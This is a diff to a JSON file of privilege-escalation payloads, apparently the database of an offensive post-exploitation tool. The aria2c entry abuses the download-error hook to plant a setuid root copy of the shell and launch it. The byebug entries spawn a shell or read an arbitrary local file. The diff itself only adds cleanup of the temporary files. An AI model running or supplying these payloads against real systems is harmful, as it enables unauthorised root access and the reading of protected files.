@@ -153,8 +153,8 @@
 	"aria2c": [
 		{
 			"type": "shell",
-			"payload": "export TF=$({mktemp}); export SH=$({mktemp}); {cp} {shell} $SH; echo \"{chown} root:root $SH; {chmod} +sx $SH\" > $TF; {chmod} +x $TF; {command}; sleep 1; $SH -p",
-			"input": "rm $TF; rm $SH; unset TF; unset $SH;\n",
+			"payload": "export TF=$({mktemp}); export SH=$({mktemp}); {cp} {shell} $SH; echo \"{chown} root:root $SH; {chmod} +sx $SH\" > $TF; {chmod} +x $TF; {command}; sleep 1; {rm} -f $TF; $SH -p",
+			"input": "rm -f $TF; rm -f $SH; unset TF; unset SH;\n",
 			"args": ["--on-download-error=$TF", "http://x"],
 			"exit": "exit"
 		}
@@ -275,13 +275,13 @@
 	"byebug": [
 		{
 			"type": "shell",
-			"payload": "TF=$({mktemp}); echo 'system(\"{shell}\")' > $TF; {command}",
+			"payload": "TF=$({mktemp}); echo 'system(\"{shell}\")' > $TF; {command}; rm -f $TF",
 			"args": ["--no-stop", "-q", "$TF"],
 			"exit": "exit\n"
 		},
 		{
 			"type": "read",
-			"payload": "TF=$({mktemp}); echo 'system(\"{cat} {lfile}\")' > $TF; {command}",
+			"payload": "TF=$({mktemp}); echo 'system(\"{cat} {lfile}\")' > $TF; {command}; rm -f $TF",
 			"args": ["--no-stop", "-q", "$TF"],
 			"exit": "exit\n"
 		}
